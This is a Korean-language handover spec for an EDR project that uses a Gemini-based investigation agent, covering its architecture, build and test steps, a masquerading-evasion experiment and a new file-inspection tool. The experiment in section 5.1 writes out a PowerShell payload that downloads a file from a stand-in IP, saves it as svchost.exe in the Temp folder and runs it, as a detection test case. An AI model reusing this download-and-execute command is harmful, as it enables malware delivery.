---
description: >-
  Phalanx EDR Phase 1~4.1 구현 완료 현황, 복합 회피 실험 한계점, FileInspectionTool 상세 규격,
  후속 필수 실험 과제 및 개발 에이전트를 위한 핵심 기술 인수인계 사양서.
related:
  - ../README.md
  - ./01_system_architecture.md
  - ./02_ai_agent_investigation_design.md
  - ./03_implementation_roadmap.md
  - ./04_performance_benchmarks.md
  - ../../troubleshooting/phalanx.md
---
# Phalanx EDR Agent Handover Specification (Phase 1 ~ 4.1)

## 1. 프로젝트 현황 및 리포지토리 매핑

* **메인 리포지토리**: `../Phalanx` (로컬 워크스페이스: `C:\Users\adg01\Documents\GitHub\Phalanx`)
  * 활성 작업 브랜치: `feature/phase3-ai-hunter`
  * 원격 저장소: `https://github.com/jin20203458/phalanx` (최신 커밋 푸시 완료)
* **지식베이스 리포지토리**: `../Obsidian.Agent` (로컬 워크스페이스: `C:\Users\adg01\Documents\GitHub\Obsidian.Agent`)
  * 공식 스펙: `Phalanx/docs/`
  * 트러블슈팅 런북: `troubleshooting/phalanx.md` (12개 핵심 기술 문제 해결 내역 보존)
* **솔루션 파일**: `Phalanx.sln` (Visual Studio 2026 / Dev18 및 VS 2022 v17.x 호환 표준 솔루션)

---

## 2. 핵심 아키텍처 불변식 (Invariants - 위반 금지 규칙)

후속 작업을 수행하는 에이전트는 아래 5대 불변식을 반드시 준수해야 합니다:

1. **AI 수사관 단일 진실 공급원 (SSOT Decision Authority)**:
   * ReAct 루프가 정상 종결(`reachedFinal == true && hasValidAction`)된 경우, Gemini 모델의 `VerdictAction`(`ACTION_KILL` vs `ACTION_RESUME`)은 절대적 최상위 결정권을 가집니다.
   * `CommandLine.Contains("-enc")` 등 단순 정적 문자열 검사로 LLM의 정상 판결을 사살로 강제 오버라이드하거나 사내 IP를 임의 차단하는 하드코딩 if문을 절대 추가하지 마십시오.
   * 시스템 가드는 **최대 턴(5턴) 초과 타임아웃** 또는 **API 완전 단절/예외** 시의 Fail-Secure 방어에만 국한되어야 합니다.
2. **세이프티 워치독 SLA 계약 (10초 기본 / 50초 연장 티켓)**:
   * C++ 센서는 프로세스를 동결할 때 데드락 및 고아 동결(Orphan Freeze) 방지를 위해 기본 10초(10,000ms) 안전 타임아웃을 적용합니다 (`SafetyWatchdog.h:37`).
   * 오프라인 로컬 규칙 엔진(평균 23ms 완결)은 연장을 요청하지 않으므로, 비정상 크래시 시 10초 데드락 자가 회복(Auto-Resume)이 보장됩니다.
   * C# AI 헌터가 외부 LLM 심층 수사에 진입할 경우 즉시 `ACTION_EXTEND_TIMEOUT` 티켓을 선제 발송하여 마감 기한을 1회에 한해 50초 누적 연장(+50,000ms ➔ 총 60초 예산 확보)합니다 (`SafetyWatchdog.h:55`, `AutonomousHunterAgent.cs:120-125`).
   * C# 최상위 타임아웃 CTS는 네트워크 통신 레이스를 차단하고 워치독 만료 10초 전 안전 마진을 두기 위해 50초(50,000ms)로 엄격 제한합니다 (`AutonomousHunterAgent.cs:131`, `troubleshooting/phalanx.md:43`).
3. **UI 스레드 안전 마샬링 및 Headless 호환성**:
   * Kestrel gRPC 및 비동기 작업 스레드는 `ObservableCollection`을 직접 조작할 수 없습니다. 반드시 `CockpitUiBridge.Instance`를 거쳐 `Dispatcher.InvokeAsync`로 마샬링하십시오.
   * 비GUI 환경(단위 테스트 및 `--headless` CI 러너)을 위해 `Application.Current`가 null이어도 예외 없이 안전 통과하는 Null-Safety 방어를 유지해야 합니다.
4. **무결성 레벨 분리 및 수명주기 정리 (Orderly Teardown)**:
   * 관리자 권한(`High Integrity`)으로 기동된 C++ 센서는 일반 권한(`Medium Integrity`)의 C#에서 OS 레벨 강제 종료가 거부될 수 있습니다.
   * 종료 시에는 반드시 (1) gRPC `PHALANX_SENSOR_SHUTDOWN` 역전송, (2) Win32 `Local\PhalanxSensorShutdownEvent` 시그널링, (3) `sensorProcess.WaitForExit(3000)` 순서를 유지한 후 Kestrel gRPC 서버를 폐쇄하십시오.
5. **모던 상용 EDR 룩앤필 (0 Emojis Policy)**:
   * 관제 GUI 화면(XAML) 및 뷰모델에 이모티콘(🤖, 🔴, 🛡️ 등)을 사용하지 마십시오. 순수 XAML 벡터 지오메트리(`IconShield`, `IconTerminal`, `IconKill` 등)와 Obsidian 다크 팔레트 토큰만을 사용합니다.

---

## 3. 컴포넌트 맵 및 핵심 파일 색인

```
Phalanx Root
├── proto/phalanx.proto                      # gRPC 양방향 스트리밍 프로토콜 (TelemetryBatch ↔ MitigationCommand)
├── src/
│   ├── Phalanx.Sensor/ (C++20 Native)       # 커널 텔레메트리 센서 & 고속 액추에이터
│   │   ├── main.cpp                         # 센서 진입점, SeDebugPrivilege, Local 명명 이벤트 감시
│   │   ├── Collector/EtwKernelCollector.cpp # Windows 커널 ETW 후킹 수집기
│   │   ├── Actuator/ProcessActuator.cpp     # 24μs NtSuspendProcess 동결 및 0.1ms TerminateProcess 사살
│   │   ├── Actuator/SafetyWatchdog.cpp      # 데드라인 기반 동결 해제 워치독
│   │   ├── Rules/LocalRuleEngine.cpp        # 100μs 오프라인 로컬 규칙 엔진 (PDF/HWP/Office 자식 프로세스)
│   │   └── Ipc/GrpcStreamClient.cpp         # asio-grpc C++20 코루틴 클라이언트 (종료 명령 바이패스 포함)
│   └── Phalanx.Cockpit/ (C# .NET 9/10 WPF)  # 엔터프라이즈 관제 허브 & 자율 AI 헌터
│       ├── Program.cs                       # STA 진입점, 백그라운드 Kestrel gRPC, 순차 동기 정리, --headless 지원
│       ├── App.xaml / App.xaml.cs           # WPF App 정의 및 테마 머지
│       ├── Themes/EnterpriseTheme.xaml      # Obsidian 다크 토큰, 벡터 지오메트리, 버튼/카드 스타일
│       ├── Views/MainWindow.xaml            # 상단 텔레메트리 바, 사건 목록, 우측 점진적 포렌식 인스펙터
│       ├── ViewModels/MainViewModel.cs      # 카운터, 필터/검색, 토글 커맨드, 사건 뷰모델 관리
│       ├── Services/CockpitUiBridge.cs      # UI 스레드 디스패처 마샬링 싱글톤 브리지
│       ├── Services/SensorProcessController.cs # 바이너리 탐색, UAC runas 기동, Win32 로컬 이벤트 종료
│       ├── Agent/AutonomousHunterAgent.cs   # Gemini 3.7 Flash 자율 ReAct 수사관 & 다차원 FSM 엔진
│       ├── Agent/Gemini/GeminiRestClient.cs # Vertex AI OAuth2 / Gemini API JSON Mode REST 통신
│       ├── CQRS/ProcessTreeProjectionManager.cs # 인메모리 프로세스 트리 투영 및 족보 추적
│       ├── Storage/ForensicArchiveManager.cs# LiteDB 기반 침해사고 영속 스토리지
│       └── Tools/ (5대 OS 포렌식 도구)
│           ├── DecodePayloadTool.cs         # Base64, Gzip/Deflate 매직 바이트, Hex 해독
│           ├── ProcessMemoryScanTool.cs     # VirtualQueryEx VAD unbacked 실행 메모리 핀포인트 스캔
│           ├── ThreatReputationTool.cs      # 사설망 마스킹, 공공 DNS 화이트리스트, IoC 평가
│           ├── MitreClassifierTool.cs       # 26종 정규식 MITRE ATT&CK 전술 매핑
│           └── SystemFirewallTool.cs        # 게이트웨이 보호망 기반 Windows 방화벽 C2 차단
└── tests/
    ├── Phalanx.Agent.Tests/                 # C# 25개 단위 테스트 및 Live 풀체인 테스트
    └── FullChainCrossE2ETest/               # C++ ➔ C# Cockpit ➔ C++ 크로스 랭귀지 E2E 테스트 바이너리
```

---

## 4. 운영 가이드라인 및 검증 체계 (Operational Guide & Verification)

### 4.1 LLM 인증 정보 구성 (Clean-Room Credential Architecture)

Phalanx는 타 저장소(예: MundusVivens)에 대한 런타임 의존성 없이 자체 격리(Clean-Room) 환경에서 동작합니다:
1. **환경 변수 우선**: `GOOGLE_APPLICATION_CREDENTIALS` 환경 변수가 지정되어 있을 경우 최우선 로드.
2. **Phalanx 자체 로컬 Config**: 환경 변수 미지정 시 `src/Phalanx.Cockpit/Config/google-credentials.json` 및 `src/Phalanx.Cockpit/AppSettings.json`에서 자체 프로젝트/서비스 계정 정보 탐색.
3. **보안 규칙**: `google-credentials.json` 및 `AppSettings.json`은 `.gitignore`에 등록되어 엄격히 커밋에서 제외됨.

### 4.2 빌드 및 검증 명령어 (Mandatory Verification Suite)

모든 작업 완료 후 보고 전 반드시 아래 명령을 실행하여 **Exit Code 0**을 실사하십시오:

```powershell
# 1. C# 전체 프로젝트 빌드 (오류 0개, 경고 0개 확인)
dotnet build Phalanx.sln

# 2. C# 순수 단위 테스트 실행 (25개 전원 통과 확인, ~1초)
dotnet test tests/Phalanx.Agent.Tests/ --filter "Category=Unit"

# 3. Google Cloud Vertex AI 실시간 Live 연동 테스트 (선택적: 인증 정보 세팅 시)
dotnet test tests/Phalanx.Agent.Tests/ --filter "Category=Live"

# 4. C++ 네이티브 프로젝트 빌드
powershell -ExecutionPolicy Bypass -File .\build.ps1

# 5. 5대 풀체인 E2E 통합 검증 스위트 실행 (전 단계 통과 확인)
powershell -ExecutionPolicy Bypass -File .\scripts\run_fullchain_test.ps1
```

---

## 5. 복합 회피 공격(Masquerading) 실험 결과 및 실측 한계점 분석

### 5.1 실험 개요 및 환경
* **배경**: 10대 실무 시나리오(악성 6종 + 정상 4종) 벤치마크에서는 평균 2.40턴, 12.57초 만에 100% 정확도로 판결이 종결되었습니다. 그러나 이는 알려진 위협 IoC(블랙리스트 IP, 악성 파라미터)가 비교적 명확한 시나리오였습니다.
* **실험 설계**: 블랙리스트에 등재되지 않은 미등록 외부 IP와 시스템 핵심 파일명 위장 기법이 결합된 **복합 회피 공격(T1036.005 Masquerading)**을 모의하여 AI 수사관의 심층 추론 및 도구 연동 한계를 실측하였습니다.
* **공격 벡터**:
  * 부모 프로세스: `explorer.exe` (정상 셸 컨텍스트)
  * 실행 명령: `powershell.exe -w hidden -enc <Base64>`
  * 해독 페이로드: `(New-Object Net.WebClient).DownloadFile('http://198.51.100.99/update.dat', 'C:\Windows\Temp\svchost.exe'); Start-Process 'C:\Windows\Temp\svchost.exe'`
  * 회피 요소:
    1. 외부 IP `198.51.100.99`는 신규 도메인/미등록 IP로, 평판 조회 시 사살 기준 미달(점수 30점, `INCONCLUSIVE_EXTERNAL_IP`) 처리.
    2. 생성 타깃이 윈도우 시스템 핵심 바이너리(`svchost.exe`)이나, 실제 저장 위치는 임시 디렉터리(`C:\Windows\Temp\`)로 위장.

### 5.2 실험 관측 결과 (Ground Truth)
* **총 소요 턴 수**: **5 턴** (최대 예산 5턴 완전 전소)
* **종단간 소요 시간**: **36.5 초** (36,489 ms)
* **최종 판결**: `ACTION_KILL` (확신도 96%, 방화벽 차단 완료)
* **턴별 동작 추적**:
  1. `Turn 1 (6.87초)`: `DecodePayloadTool` 호출 ➔ Base64 인라인 페이로드 해독 성공 (`update.dat` 다운로드 및 `C:\Windows\Temp\svchost.exe` 생성 확인).
  2. `Turn 2 (2.60초)`: `ThreatReputationTool` 호출 ➔ IP `198.51.100.99` 조회. 점수 30점 반환과 함께 *"단독 지표로 사살하지 말고 복합 증거를 수집하라"*는 가드레일 피드백 수신.
  3. `Turn 3 (21.70초)`: `ProcessMemoryScanTool` 호출 ➔ IP 단독 사살이 차단되자, 모델이 추가 증거 수집을 위해 프로세스 메모리 스캔을 fallback으로 시도.
  4. `Turn 4 (5.22초)`: 도구 호출 없음 (사고 종결) ➔ 숨김 옵션(`-w hidden`) + Base64 은닉 + 미등록 외부 IP + Temp 내 svchost.exe 위장(T1036.005) 증거를 종합하여 사살 확정.
  5. `Turn 5 (0.00초)`: `SystemFirewallTool` 호출 ➔ 식별된 C2 IP `198.51.100.99`를 Windows 방화벽에 즉시 차단 규칙 등록.

### 5.3 식별된 핵심 아키텍처적 한계점 (Limitations)

1. **디스크 포렌식 도구 결핍 (Tool Gap)**:
   * 공격 페이로드가 디스크에 생성하려는 타깃 파일(`C:\Windows\Temp\svchost.exe`)의 무결성, 디지털 서명(Authenticode), 시스템 정규 경로 위반 여부를 직접 검증할 수 있는 도구가 전무했습니다.
2. **비효율적 우회 호출로 인한 레이턴시 병목**:
   * 파일 검증 도구가 없자, 모델이 차선책으로 `ProcessMemoryScanTool`을 호출하였습니다.
   * 이로 인해 메모리 VAD 스캔 및 LLM 왕복에 **21.7초가 낭비**되었으며, 이는 세이프티 워치독 SLA(연장 포함 50초 마진)의 43.4%를 잠식하는 위험 요인으로 작용했습니다.
3. **평판 점수 가드레일과의 상호작용 지연**:
   * `ThreatReputationTool`이 30점(`INCONCLUSIVE`)을 반환하며 단독 사살을 차단하는 가드레일은 오탐 방지에 필수적이나, 이를 보완할 로컬 포렌식 증거 도구가 부족할 경우 에이전트가 턴을 낭비하게 만듭니다.
4. **턴 예산 임계치 도달 위험 (Budget Exhaustion Risk)**:
   * 5턴 한도 내에서 가까스로 최종 판결에 도달하였으나, 난독화가 2중으로 적용되었거나 레지스트리 영속화(Run Key) 등이 결합된 실전 고도화 APT 공격에서는 5턴을 초과하여 타임아웃 강제 Fail-Secure 사살(증적 불완전)로 종결될 위험이 실증되었습니다.

---

## 6. 실무 악성코드 탐지 고도화를 위한 신규 도구 규격 (`FileInspectionTool`)

위 한계점을 근본적으로 해결하기 위해, 디스크 파일 메타데이터, 디지털 서명, 시스템 경로 위장을 0.05초 이내에 확증할 수 있는 `FileInspectionTool`을 신설해야 합니다.

### 6.1 도구 설계 목적 및 책임 (Responsibility)
* 디스크 파일의 존재 유무 확인 및 정적 메타데이터(크기, 시간, 해시) 수집.
* Win32 `WinVerifyTrust` 기반 Microsoft 정식 디지털 서명(Authenticode) 체인 검증.
* 윈도우 시스템 핵심 실행 파일(System32)의 비인가 디렉터리(Temp, AppData 등) 위장 배치(Masquerading) 적발.
* PE 헤더 매직 바이트 검사 및 확장자 위장(Executable disguised as .dat/.jpg) 즉각 감별.

### 6.2 핵심 기능 및 기술 구현 사양

#### A. 디지털 서명 검증 (Authenticode Verification)
* **구현 방식**: `wintrust.dll` 및 `crypt32.dll`의 `WinVerifyTrust` API P/Invoke 호출.
* **검증 액션 GUID**: `WINTRUST_ACTION_GENERIC_VERIFY_V2` (`{00AAC56B-CD44-11d0-8CC2-00C04FC295EE}`).
* **주요 플래그**:
  * `WDF_REVOCATION_CHECK_NONE` (오프라인/동결 상태 고속 검증용) 또는 `WDF_REVOCATION_CHECK_CHAIN`
  * `WTD_STATEACTION_VERIFY`
* **추출 정보**: 서명 유효 여부(`IsValid`), 서명 주체(`SignerSubjectName`), 발급자(`IssuerName`), 카탈로그 서명 여부(`IsCatalogSigned`).
* **판정 기준**: Microsoft Windows 정규 서명이 없거나 유효하지 않은 `svchost.exe`, `csrss.exe`, `lsass.exe` 등은 즉시 위험 점수 100점 부여.

#### B. 시스템 파일 경로 위장 탐지 (Path Anomaly Detection)
* **보호 대상 시스템 프로세스 화이트리스트 맵**:
  * `svchost.exe`, `csrss.exe`, `smss.exe`, `wininit.exe`, `winlogon.exe`, `services.exe`, `lsass.exe` ➔ 정규 경로: `C:\Windows\System32\`
  * `explorer.exe` ➔ 정규 경로: `C:\Windows\`
* **탐지 로직**:
  * 파일명이 시스템 화이트리스트에 포함되는데, 실제 경로가 `\Temp\`, `\AppData\`, `\Users\Public\`, `\PerfLogs\` 등에 위치할 경우 `IsPathMasqueraded = true` 판정.

#### C. 파일 엔트로피 및 확장자 위장 분석
* **Shannon Entropy 연산**:
  * 파일 바이트 스트림(최대 1MB 샘플링) 대상 섀넌 엔트로피 계산.
  * $H(X) = -\sum_{i=1}^{n} P(x_i) \log_2 P(x_i)$
  * 엔트로피 $> 7.2$ 인 경우 고밀도 암호화/패킹(UPX, Themida 등) 페이로드로 분류.
* **매직 바이트 감별**:
  * 파일 확장자가 `.dat`, `.txt`, `.jpg`, `.log` 등 비실행형 확장자이나, 첫 2바이트가 `MZ` (`0x4D, 0x5A`)이고 PE 헤더(`PE\0\0`)가 존재하는 경우 `IsDisguisedExecutable = true` 판정.

### 6.3 입출력 데이터 규격 (Interface Specification)

```csharp
namespace Phalanx.Cockpit.Tools;

public sealed class FileInspectionTool : IForensicTool
{
    public string Name => "FileInspectionTool";
    public string Description => 
        "디스크 상의 파일 경로, 디지털 서명(Authenticode), 시스템 파일 위장(Masquerading), " +
        "PE 헤더 정합성, 엔트로피를 정밀 검증합니다. 인자: { \"filePath\": \"C:\\\\...\" }";

    // 도구 입력 인자 모델
    public sealed class Input
    {
        [JsonPropertyName("filePath")]
        public string FilePath { get; set; } = string.Empty;
    }

    // 도구 관측 결과 모델
    public sealed class Output
    {
        public bool Exists { get; set; }
        public string NormalizedPath { get; set; } = string.Empty;
        public long FileSizeBytes { get; set; }
        public string Sha256 { get; set; } = string.Empty;
        public double Entropy { get; set; }
        public bool IsSigned { get; set; }
        public string SignerSubject { get; set; } = string.Empty;
        public string SignatureStatus { get; set; } = string.Empty; // e.g. "VALID_MICROSOFT", "INVALID_OR_UNSIGNED"
        public bool IsPathMasqueraded { get; set; }
        public bool IsDisguisedExecutable { get; set; }
        public int AnomalyScore { get; set; } // 0 ~ 100
        public string DiagnosticReason { get; set; } = string.Empty;
    }
}
```

### 6.4 `AutonomousHunterAgent` 프롬프트 및 도구 등록 통합
* **도구 등록**: `AutonomousHunterAgent` 생성자에서 `_tools["FileInspectionTool"] = new FileInspectionTool();` 등록.
* **PICCO 시스템 프롬프트 업데이트**:
  * `[AVAILABLE FORENSIC TOOLS]` 섹션에 `FileInspectionTool` 인터페이스 및 입출력 명세 추가.
  * **수사 지침 규칙(Rules)**:
    *"페이로드 해독이나 명령행에서 다운로드/생성되는 로컬 파일 경로가 포착되면, 메모리 스캔보다 먼저 FileInspectionTool을 호출하여 디지털 서명 및 시스템 경로 위장(Masquerading) 여부를 우선 확증하십시오."*

---

## 7. 후속 개발 에이전트를 위한 향후 필수 실험 및 벤치마크 과제 (Future Empirical Research)

차기 에이전트는 아래 5대 실험 과제를 순차적으로 진행하여 실측 데이터(Ground Truth)를 확보해야 합니다:

### 과제 1: `FileInspectionTool` 주입 후 복합 회피 공격 수사 압축률 검증
* **실험 목적**: `FileInspectionTool` 신설 후, 동일한 복합 회피 공격(T1036.005) 시나리오에서 턴 수 및 레이턴시의 단축 효과를 실측.
* **가설**:
  * 기존: Turn 1(해독) ➔ Turn 2(IP 평판 30점 미달) ➔ Turn 3(메모리 스캔 21.7초) ➔ Turn 4(종결) = 총 5턴, 36.5초.
  * 개선: Turn 1(해독) ➔ Turn 2(`FileInspectionTool`로 Temp 내 svchost 무서명/위장 확증, 0.05초) ➔ Turn 3(최종 사살 집행) = **총 2~3턴, 10초 내외 종결 (72% 단축)**.
* **검증 방법**:
  * `AutonomousHunterAgentTests`에 `TestLive_ConvolutedEvasiveMasquerading_WithFileInspection` 테스트 신설.
  * 소요 턴 수, 턴별 도구 호출 시퀀스, 총 레이턴시 집계 후 `04_performance_benchmarks.md`에 등재.

### 과제 2: LOLBAS 듀얼 위장 및 Living-off-the-Land 바이너리 심층 분별 실험
* **실험 목적**: 정상 서명된 유효 바이너리(`certutil.exe`, `mshta.exe`, `powershell.exe`)가 악성 인자를 동반할 때와, 파일 자체가 가짜 바이너리로 교체/위장된 경우의 이중 분별력 검증.
* **테스트 케이스**:
  1. 정품 `certutil.exe` (Microsoft 서명 유효) + 악성 URL 인자 ➔ `DecodePayloadTool` + `ThreatReputationTool` 중심 사살.
  2. 악성 트로이목마 `certutil.exe` (임시 폴더 배치, 서명 무효) ➔ `FileInspectionTool` 단독 1턴 즉각 사살.

### 과제 3: YARA 룰셋 연계 인메모리 핀포인트 스캔 연동 실험
* **실험 목적**: `ProcessMemoryScanTool`의 단순 VAD 실행 속성(`PAGE_EXECUTE_READWRITE`) 검사를 넘어, 인메모리 바이트 패턴에 사전 컴파일된 YARA 룰셋(Cobalt Strike Beacon, Meterpreter, Mimikatz)을 매칭하는 성능 실측.
* **성능 목표**: 4KB~64KB 커밋 메모리 블록 대상 매칭 지연시간 1.0ms 이하 유지.

### 과제 4: 다중 프로세스(Multi-Process Tree) 상속 체인 추적 및 동시 동결/수사 확장성 실험
* **실험 목적**: 오피스 매크로(`winword.exe`)가 자식 CMD(`cmd.exe`), 손자 파워셸(`powershell.exe`), 증손자 호스트(`conhost.exe`)를 연속 분기하는 트리형 공격에서, C++ 센서의 동시 다중 동결(`NtSuspendProcess` x N) 및 C# AI 헌터의 상속 체인 일괄 처분 검증.
* **검증 항목**: 프로세스 트리 투영 매니저(`ProcessTreeProjectionManager`)의 인메모리 DAG 상에서 부모-자식 관계의 고아(Ghost/Tombstone) 누수 여부 전수 감사.

### 과제 5: 고부하(Burst Telemetry) 상황에서의 Kestrel gRPC 스트리밍 큐 및 I/O 병목 실측
* **실험 목적**: 초당 10,000건 이상의 프로세스 생성/종료 이벤트 폭주 시, C++ `asio-grpc` 클라이언트와 C# Kestrel gRPC 서버 간의 더블 버퍼링 링버퍼 오버플로 및 LiteDB 스토리지 I/O 병목 측정.
* **평가 지표**: 이벤트 드롭률(0.00% 달성 여부), C# GC Gen2 컬렉션 빈도, 메모리 풋프린트 상한선(< 150MB).

---

## 8. 차기 백로그 및 구현 권장 사항 (Next Backlog)

1. **`FileInspectionTool.cs` 구현 및 단위 테스트 작성**:
   * `src/Phalanx.Cockpit/Tools/FileInspectionTool.cs` 신설.
   * `WinVerifyTrust` P/Invoke 구조체 정의 및 단위 테스트(`tests/Phalanx.Agent.Tests/Tools/FileInspectionToolTests.cs`)를 통한 모의 파일 서명/경로 위장 검증.
2. **QuestPDF 기반 포렌식 감사 리포트 (A4 PDF Export)**:
   * 관제 화면에서 사건 카드 선택 시, LiteDB의 수사 기록(`ForensicIncidentRecord`)과 ReAct 추론 트레이스를 바탕으로 공공/금융 보안 표준 양식의 1장 요약 A4 PDF 문서 생성 기능 구현.
3. **MITRE ATT&CK 내비게이터 매트릭스 시각화 뷰**:
   * 우측 포렌식 인스펙터에 12대 공격 전술 매트릭스를 미니 맵 형태로 시각화하여 현재 탐지된 공격 단계(Tactic)를 하이라이트 표시.

